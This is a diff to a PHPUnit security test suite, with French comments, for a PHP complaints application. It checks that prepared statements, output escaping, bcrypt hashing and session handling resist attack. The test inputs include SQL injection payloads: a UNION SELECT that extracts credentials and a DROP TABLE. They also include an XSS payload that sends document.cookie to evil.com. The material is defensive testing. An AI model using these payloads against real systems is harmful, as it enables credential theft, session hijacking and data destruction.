@@ -9,7 +9,7 @@ class SecurityTest extends TestCase
     protected function setUp(): void
     {
         $this->pdo = new PDO(
-            "mysql:host=" . getenv('DB_HOST') . ";port=3306;dbname=" . getenv('DB_NAME') . ";charset=utf8",
+            "mysql:host=" . getenv('DB_HOST') . ";port=3306;dbname=" . getenv('DB_NAME') . ";charset=utf8mb4",
             getenv('DB_USER'),
             getenv('DB_PASS'),
             [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
@@ -19,118 +19,127 @@ class SecurityTest extends TestCase
 
     // ── SQL INJECTION ──────────────────────────────────────────
 
-    // Test 1 : injection SQL classique bloquée par prepared statement
-    public function testSqlInjectionBlockedByPreparedStatement()
+    // Test 1 : injection SQL sur users.email bloquée par prepared statement
+    public function testSqlInjectionOnEmailBlocked()
     {
         $malicious = "' OR '1'='1' --";
 
         $stmt = $this->pdo->prepare(
-            "SELECT COUNT(*) FROM utilisateurs WHERE email = :email AND password = :pass"
+            "SELECT COUNT(*) FROM users WHERE email = :email AND mot_de_passe = :mdp"
         );
-        $stmt->execute([':email' => $malicious, ':pass' => $malicious]);
+        $stmt->execute([':email' => $malicious, ':mdp' => $malicious]);
         $count = (int) $stmt->fetchColumn();
 
-        // L'injection ne doit retourner aucun résultat
-        $this->assertEquals(0, $count, "L'injection SQL a réussi — utiliser des prepared statements");
+        $this->assertEquals(0, $count, "Injection SQL réussie sur users.email — utiliser des prepared statements");
     }
 
-    // Test 2 : UNION injection bloquée
-    public function testUnionInjectionBlocked()
+    // Test 2 : UNION injection sur users bloquée
+    public function testUnionInjectionOnUsersBlocked()
     {
-        $malicious = "' UNION SELECT 1,2,3 --";
+        $malicious = "' UNION SELECT id, email, mot_de_passe, role, nom FROM users --";
 
-        $stmt = $this->pdo->prepare("SELECT email FROM utilisateurs WHERE email = ?");
+        $stmt = $this->pdo->prepare("SELECT email FROM users WHERE email = ?");
         $stmt->execute([$malicious]);
         $result = $stmt->fetchAll();
 
-        $this->assertEmpty($result, "UNION injection a produit des résultats");
+        $this->assertEmpty($result, "UNION injection a produit des résultats sur la table users");
+    }
+
+    // Test 3 : injection sur reclamations.objet bloquée
+    public function testSqlInjectionOnObjetBlocked()
+    {
+        $malicious = "'; DROP TABLE reclamations; --";
+
+        $stmt = $this->pdo->prepare("SELECT COUNT(*) FROM reclamations WHERE objet = ?");
+        $stmt->execute([$malicious]);
+        // La table doit toujours exister
+        $check = $this->pdo->query("SHOW TABLES LIKE 'reclamations'")->fetchColumn();
+        $this->assertNotFalse($check, "La table reclamations a été supprimée par injection");
     }
 
     // ── XSS ───────────────────────────────────────────────────
 
-    // Test 3 : htmlspecialchars neutralise les balises script
-    public function testXssScriptTagNeutralized()
+    // Test 4 : XSS dans objet de réclamation neutralisé
+    public function testXssInObjetNeutralized()
     {
         $input  = '<script>alert("xss")</script>';
         $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
-
         $this->assertStringNotContainsString('<script>', $output);
         $this->assertStringContainsString('&lt;script&gt;', $output);
     }
 
-    // Test 4 : attribut javascript: neutralisé
-    public function testXssJavascriptAttributeNeutralized()
+    // Test 5 : XSS dans description de réclamation neutralisé
+    public function testXssInDescriptionNeutralized()
+    {
+        $input  = '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">';
+        $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+        $this->assertStringNotContainsString('onerror', $output);
+        $this->assertStringNotContainsString('<img', $output);
+    }
+
+    // Test 6 : XSS dans commentaire neutralisé
+    public function testXssInCommentaireNeutralized()
     {
         $input  = '<a href="javascript:alert(1)">click</a>';
         $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
-
         $this->assertStringNotContainsString('javascript:', $output);
-    }
-
-    // Test 5 : event handler onmouseover neutralisé
-    public function testXssEventHandlerNeutralized()
-    {
-        $input  = '<img src=x onmouseover="alert(1)">';
-        $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
-
-        $this->assertStringNotContainsString('onmouseover', $output);
     }
 
     // ── MOT DE PASSE ──────────────────────────────────────────
 
-    // Test 6 : le mot de passe est stocké haché (jamais en clair)
+    // Test 7 : le mot de passe est stocké haché (colonne mot_de_passe)
     public function testPasswordIsStoredHashed()
     {
         $plain = "TestPassword123!";
         $hash  = password_hash($plain, PASSWORD_BCRYPT);
 
-        // Le hash ne doit jamais être égal au mot de passe en clair
         $this->assertNotEquals($plain, $hash);
-        // Mais la vérification doit fonctionner
         $this->assertTrue(password_verify($plain, $hash));
+        // Vérifier le format bcrypt ($2y$) utilisé dans la base
+        $this->assertStringStartsWith('$2y$', $hash);
     }
 
-    // Test 7 : deux hachages du même mot de passe sont différents (salt aléatoire)
-    public function testPasswordHashesAreDifferent()
+    // Test 8 : les mots de passe en base sont bien du bcrypt
+    public function testExistingPasswordsAreBcrypt()
     {
-        $plain  = "SamePassword";
-        $hash1  = password_hash($plain, PASSWORD_BCRYPT);
-        $hash2  = password_hash($plain, PASSWORD_BCRYPT);
+        $stmt  = $this->pdo->query("SELECT mot_de_passe FROM users LIMIT 3");
+        $hashes = $stmt->fetchAll(PDO::FETCH_COLUMN);
 
-        $this->assertNotEquals($hash1, $hash2, "Les hachages doivent être différents (salt aléatoire)");
+        foreach ($hashes as $hash) {
+            $this->assertMatchesRegularExpression(
+                '/^\$2[ay]\$/',
+                $hash,
+                "Un mot de passe en base n'est pas en bcrypt : $hash"
+            );
+        }
     }
 
-    // Test 8 : MD5 détecté — ne doit pas être utilisé pour les mots de passe
-    public function testMd5IsNotUsedForPasswords()
+    // Test 9 : deux hachages du même mot de passe sont différents (salt aléatoire)
+    public function testPasswordHashesAreDifferentDueToSalt()
     {
-        $plain   = "password";
-        $md5hash = md5($plain);
-
-        // MD5 est trop court (32 chars) et sans salt → ne jamais l'utiliser
-        $this->assertEquals(32, strlen($md5hash));
-        // Vérifier que notre app utilise bcrypt ($2y$) et non MD5
-        $bcrypt = password_hash($plain, PASSWORD_BCRYPT);
-        $this->assertStringStartsWith('$2y$', $bcrypt, "Utiliser bcrypt, pas MD5");
+        $plain = "SamePassword";
+        $hash1 = password_hash($plain, PASSWORD_BCRYPT);
+        $hash2 = password_hash($plain, PASSWORD_BCRYPT);
+        $this->assertNotEquals($hash1, $hash2, "Les hachages doivent différer grâce au salt aléatoire");
     }
 
     // ── SESSION ───────────────────────────────────────────────
 
-    // Test 9 : l'ID de session est régénéré après login (fixation de session)
+    // Test 10 : l'ID de session est régénéré après login (anti-fixation)
     public function testSessionIdIsRegeneratedAfterLogin()
     {
         if (session_status() === PHP_SESSION_NONE) {
             session_start();
         }
         $oldId = session_id();
-        session_regenerate_id(true); // simule ce que doit faire le login
+        session_regenerate_id(true);
         $newId = session_id();
 
         $this->assertNotEquals($oldId, $newId, "L'ID de session doit être régénéré après login");
-
         session_destroy();
     }
 
-    // Test 10 : accès page protégée sans session retourne 302 ou 403
+    // Test 11 : accès page protégée sans session retourne 302/403
     public function testProtectedPageBlockedWithoutSession()
     {
         $ch = curl_init($this->baseUrl . '/index/dashboard.php');
@@ -143,8 +152,18 @@ class SecurityTest extends TestCase
 
         $this->assertContains(
             $code,
-            [302, 301, 403],
-            "Une page protégée sans session doit rediriger ou bloquer (code: $code)"
+            [301, 302, 403],
+            "Une page protégée sans session doit rediriger ou bloquer (code reçu : $code)"
         );
+    }
+
+    // Test 12 : rôle admin non accessible à un Réclamant
+    public function testRoleAdminNotAccessibleToReclamant()
+    {
+        $stmt  = $this->pdo->prepare("SELECT role FROM users WHERE email = ?");
+        $stmt->execute(['reclamant@email.com']);
+        $role  = $stmt->fetchColumn();
+
+        $this->assertNotEquals('admin', $role, "Le compte reclamant ne doit pas avoir le rôle admin");
     }
 }
